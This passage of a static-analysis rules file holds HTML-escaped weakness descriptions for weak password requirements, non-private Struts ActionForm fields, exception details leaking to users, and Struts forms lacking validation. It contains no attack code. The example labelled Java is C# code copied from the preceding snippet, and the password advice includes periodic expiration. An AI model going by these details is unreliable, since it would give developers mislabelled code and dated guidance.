&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;An authentication mechanism is only as strong as its credentials. For this
reason, it is important to require users to have strong passwords. Lack of
password complexity significantly reduces the search space when trying to
guess user's passwords, making brute-force attacks easier.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_521_Time of Introduction" id="oc_521_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_521_Potential Mitigations" id="oc_521_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Enforce usage of strong passwords. A password strength policy should
contain the following attributes: (1) Minimum and maximum length; (2)
Require mixed character sets (alpha, numeric, special, mixed case); (3)
Do not contain user name; (4) Expiration; (5) No password reuse.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Authentication mechanisms should always require sufficiently complex
passwords and require that they be periodically changed.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_521_Relationships" id="oc_521_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;255&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=255" target="_blank"&gt;Credentials Management&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;693&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=693" target="_blank"&gt;Protection Mechanism Failure&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;724&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=724" target="_blank"&gt;OWASP Top Ten 2004 Category A3 - Broken Authentication and Session Management&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;258&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=258" target="_blank"&gt;Empty Password in Configuration File&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_521_Taxonomy Mappings" id="oc_521_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Anonymous Tool Vendor (under NDA)&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP Top Ten 2004&lt;/td&gt;&lt;td valign="top"&gt;A3&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE More Specific&lt;/td&gt;&lt;td valign="top"&gt;Broken Authentication and Session
Management&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_521_Related Attack Patterns" id="oc_521_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org16.html" target="_blank"&gt;16&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Dictionary-based Password Attack&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org49.html" target="_blank"&gt;49&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Password Brute Forcing&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org55.html" target="_blank"&gt;55&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Rainbow Table Password Cracking&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org70.html" target="_blank"&gt;70&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Try Common(default) Usernames and Passwords&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org112.html" target="_blank"&gt;112&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Brute Force&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_521_Content History" id="oc_521_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Anonymous Tool Vendor (under NDA)&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-08-15&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Veracode&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Suggested OWASP Top Ten 2004
mapping&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Related Attack Patterns&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_664</key><name>Struts_Non_Private_Field_In_ActionForm_Class</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Non-private Field in ActionForm Class&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;608&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_608_Description" id="oc_608_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;An ActionForm class contains a field that has not been declared
private, which can be accessed without using a setter or
getter.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_608_Time of Introduction" id="oc_608_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_608_Applicable Platforms" id="oc_608_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_608_Potential Mitigations" id="oc_608_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Make all fields private. Use getter to get the value of the field.
Setter should be used only by the framework; setting an action form
field from other actions is bad practice and should be avoided.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_608_Weakness Ordinalities" id="oc_608_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_608_Relationships" id="oc_608_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;668&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=668" target="_blank"&gt;Exposure of Resource to Wrong Sphere&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('608_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_608_Causal Nature" id="oc_608_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_608_Content History" id="oc_608_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Anonymous Tool Vendor (under NDA)&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1646</key><name>Information_Exposure_Through_Server_Log</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Exposed details about the application&amp;#8217;s environment, users, or associated data (for example, stack trace) could enable an attacker to find another flaw and help the attacker to mount an attack.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application generates an error message including raw exceptions, either by not being handled, by explicit returning of the object, or by configuration. Exception details may include sensitive information that could leak out of the exception to the users.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ol&gt;
&lt;li&gt;Any method that could cause an exception should be wrapped in a try-catch block that:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Explicitly handles expected exceptions.&lt;/li&gt;
&lt;li&gt;Includes a default solution to explicitly handle unexpected exceptions.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Configure a global handler to prevent unhandled errors from leaving the application.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
Do not reveal exception details, instead always return a static message.

      &lt;/h4&gt;&lt;pre&gt;


try
{
// Database access or other potentially dangerous function
}
catch (SqlException ex)
{
LogException(ex);
Response.Write("Error occurred.");
}



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
Do not reveal exception details, instead always return a static message.

      &lt;/h4&gt;&lt;pre&gt;


try
{
// Database access or other potentially dangerous function
}
catch (SqlException ex)
{
LogException(ex);
Response.Write("Error occurred.");
}


      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_662</key><name>Struts_Form_Does_Not_Extend_Validation_Class</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Form Bean Does Not Extend Validation Class&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;104&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_104_Description" id="oc_104_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;If a form bean does not extend an ActionForm subclass of the
Validator framework, it can expose the application to other weaknesses related
to insufficient input validation.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_104_Time of Introduction" id="oc_104_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
